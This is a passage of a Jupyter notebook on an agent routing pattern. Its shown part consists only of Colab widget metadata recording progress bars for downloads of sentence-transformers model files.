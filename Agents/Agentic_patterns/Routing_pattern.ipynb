{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNPrwkrXgZEDMBgR0SwJAA/",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "92b662a8f22a42f08a42070c59d6be81": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_16a0e03dd5f248fc8a9470f8c30f64fd",
              "IPY_MODEL_20a4036254f04354adcfe8749a2bd830",
              "IPY_MODEL_cbc2d46dc72f4e24ba1a45f1d297715f"
            ],
            "layout": "IPY_MODEL_8576283e5ea14e7fa32da295af643d85"
          }
        },
        "16a0e03dd5f248fc8a9470f8c30f64fd": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4dd894dc12bc4cdbbc44fd2d3890172b",
            "placeholder": "​",
            "style": "IPY_MODEL_d1c9b2ef55d44e78b36b65cf1fe12b98",
            "value": "modules.json: 100%"
          }
        },
        "20a4036254f04354adcfe8749a2bd830": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_7125010422b24325bb82a551b346806f",
            "max": 349,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_5ca7fb7f11a948bd898f311906e0bcf2",
            "value": 349
          }
        },
        "cbc2d46dc72f4e24ba1a45f1d297715f": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4cff4f0ecf354d95bba4a1a253d3aadf",
            "placeholder": "​",
            "style": "IPY_MODEL_2da80a2f34864edeb0cae4064c42b287",
            "value": " 349/349 [00:00&lt;00:00, 31.2kB/s]"
          }
        },
        "8576283e5ea14e7fa32da295af643d85": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "4dd894dc12bc4cdbbc44fd2d3890172b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "d1c9b2ef55d44e78b36b65cf1fe12b98": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "7125010422b24325bb82a551b346806f": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "5ca7fb7f11a948bd898f311906e0bcf2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "4cff4f0ecf354d95bba4a1a253d3aadf": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2da80a2f34864edeb0cae4064c42b287": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "d89e19ba439845ac9a3dd5b952013976": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_266ed5ece8cf48599672aeb36304b0d5",
              "IPY_MODEL_bfc42ffd563d4fd2b5f6d39b0c3e0b81",
              "IPY_MODEL_eaedbdee2d3c47999d6f2879df8cf512"
            ],
            "layout": "IPY_MODEL_e11a8980bde44f12b2dbd4f91e7d4d40"
          }
        },
        "266ed5ece8cf48599672aeb36304b0d5": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_2f77145e3a174343a3d5666fca10b5ca",
            "placeholder": "​",
            "style": "IPY_MODEL_301422bebbcd4ca3a36fc96320c5a6fc",
            "value": "config_sentence_transformers.json: 100%"
          }
        },
        "bfc42ffd563d4fd2b5f6d39b0c3e0b81": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_e0f7d8078fbd45b6b95ad8d813561870",
            "max": 116,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_0a7c00c2493a47cf9ec6233f0b6698a4",
            "value": 116
          }
        },
        "eaedbdee2d3c47999d6f2879df8cf512": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_5e2254e9bf6942b0b7fabe9e3e726e46",
            "placeholder": "​",
            "style": "IPY_MODEL_a87b51f25e3d4a55bcdc858b32233cc1",
            "value": " 116/116 [00:00&lt;00:00, 10.3kB/s]"
          }
        },
        "e11a8980bde44f12b2dbd4f91e7d4d40": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2f77145e3a174343a3d5666fca10b5ca": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "301422bebbcd4ca3a36fc96320c5a6fc": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "e0f7d8078fbd45b6b95ad8d813561870": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "0a7c00c2493a47cf9ec6233f0b6698a4": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "5e2254e9bf6942b0b7fabe9e3e726e46": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "a87b51f25e3d4a55bcdc858b32233cc1": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "4040f7a607d44df3bc501e02363b51fa": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_645234e2e7ed486b89060f8a1f256e39",
              "IPY_MODEL_c4361cfd58e64cf7a49898fe5485cb20",
              "IPY_MODEL_dadc98267b2a45f4990a7529c83b1a94"
            ],
            "layout": "IPY_MODEL_5d5f1bda9af74528997a123ccc3090e1"
          }
        },
        "645234e2e7ed486b89060f8a1f256e39": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_2507dcbf9cd14612b5050c58d9f4ee24",
            "placeholder": "​",
            "style": "IPY_MODEL_b6c4048a534d43d0a28d21c99745c23c",
            "value": "README.md: "
          }
        },
        "c4361cfd58e64cf7a49898fe5485cb20": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_be217058a76a479689bd01fc0365327a",
            "max": 1,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_7e3209ee00594c4d9723b50473a849b2",
            "value": 1
          }
        },
        "dadc98267b2a45f4990a7529c83b1a94": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_753b720eb66d4151bebdb47828b7637d",
            "placeholder": "​",
            "style": "IPY_MODEL_22e4d021b6e34d96b2c6dd6767d0d2d6",
            "value": " 10.5k/? [00:00&lt;00:00, 698kB/s]"
          }
        },
        "5d5f1bda9af74528997a123ccc3090e1": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "2507dcbf9cd14612b5050c58d9f4ee24": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "b6c4048a534d43d0a28d21c99745c23c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "be217058a76a479689bd01fc0365327a": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": "20px"
          }
        },
        "7e3209ee00594c4d9723b50473a849b2": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "ProgressStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "bar_color": null,
            "description_width": ""
          }
        },
        "753b720eb66d4151bebdb47828b7637d": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "model_module_version": "1.2.0",
          "state": {
            "_model_module": "@jupyter-widgets/base",
            "_model_module_version": "1.2.0",
            "_model_name": "LayoutModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "LayoutView",
            "align_content": null,
            "align_items": null,
            "align_self": null,
            "border": null,
            "bottom": null,
            "display": null,
            "flex": null,
            "flex_flow": null,
            "grid_area": null,
            "grid_auto_columns": null,
            "grid_auto_flow": null,
            "grid_auto_rows": null,
            "grid_column": null,
            "grid_gap": null,
            "grid_row": null,
            "grid_template_areas": null,
            "grid_template_columns": null,
            "grid_template_rows": null,
            "height": null,
            "justify_content": null,
            "justify_items": null,
            "left": null,
            "margin": null,
            "max_height": null,
            "max_width": null,
            "min_height": null,
            "min_width": null,
            "object_fit": null,
            "object_position": null,
            "order": null,
            "overflow": null,
            "overflow_x": null,
            "overflow_y": null,
            "padding": null,
            "right": null,
            "top": null,
            "visibility": null,
            "width": null
          }
        },
        "22e4d021b6e34d96b2c6dd6767d0d2d6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "model_module_version": "1.5.0",
          "state": {
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "DescriptionStyleModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/base",
            "_view_module_version": "1.2.0",
            "_view_name": "StyleView",
            "description_width": ""
          }
        },
        "3aa2f496463048479a91abac263b6930": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HBoxModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HBoxModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HBoxView",
            "box_style": "",
            "children": [
              "IPY_MODEL_432023cb05b94c738612b0e1fff3ecab",
              "IPY_MODEL_3cb0883328f34a22bd17e36da42486eb",
              "IPY_MODEL_b4e3196dc5454192999fe630fa113c11"
            ],
            "layout": "IPY_MODEL_079b4204904f421c9e7e172c40f4c78b"
          }
        },
        "432023cb05b94c738612b0e1fff3ecab": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_ddcb5d8a46c84f6e97e05ee0062e9353",
            "placeholder": "​",
            "style": "IPY_MODEL_cc71dceaa56742cbb65ada68a595867b",
            "value": "sentence_bert_config.json: 100%"
          }
        },
        "3cb0883328f34a22bd17e36da42486eb": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "FloatProgressModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "ProgressView",
            "bar_style": "success",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_34a212d871ff45d4b0cc7c2de93e2a1a",
            "max": 53,
            "min": 0,
            "orientation": "horizontal",
            "style": "IPY_MODEL_7f611ba3c398460aa675f3977e09531b",
            "value": 53
          }
        },
        "b4e3196dc5454192999fe630fa113c11": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "HTMLModel",
          "model_module_version": "1.5.0",
          "state": {
            "_dom_classes": [],
            "_model_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "_model_name": "HTMLModel",
            "_view_count": null,
            "_view_module": "@jupyter-widgets/controls",
            "_view_module_version": "1.5.0",
            "_view_name": "HTMLView",
            "description": "",
            "description_tooltip": null,
            "layout": "IPY_MODEL_4b923a9f47cb4cd6863404bb7fd1fa91",
            "placeholder": "​",
            "style": "IPY_MODEL_f8ae5d0862234062a1d7ec502708a28c",
            "value": " 53.0/53.0 [00:00&lt;00:00, 3.12kB/s]"
          }
        },
        "079b4204904f421c9e7e172c40f4c78b": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
